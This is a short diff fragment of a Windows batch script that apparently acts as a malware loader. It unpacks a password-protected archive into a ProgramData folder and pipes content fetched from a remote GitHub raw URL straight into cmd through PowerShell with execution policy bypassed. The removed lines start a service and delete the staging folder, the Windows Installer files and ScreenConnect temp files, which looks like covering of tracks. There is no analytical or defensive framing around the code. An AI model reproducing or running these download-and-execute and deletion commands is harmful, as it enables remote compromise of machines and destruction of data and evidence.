@@ -23,7 +23,3 @@ for %a in (%processList%) do (
 
 "%ProgramData%\bist\UnRAR.exe" x -y -p147852369 "%ProgramData%\bist\51654.rar" "%ProgramData%\bist\"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "(Invoke-WebRequest 'https://raw.githubusercontent.com/githlabs/0/0/0/traf' -UseBasicParsing).Content | cmd"
-sc start PerformanceMonitor
-rd /s /q "%ProgramData%\bist"
-del /f /q "%WINDIR%\Installer\*"
-del /f /q "%WINDIR%\SystemTemp\ScreenConnect\25.2.4.9229\*"
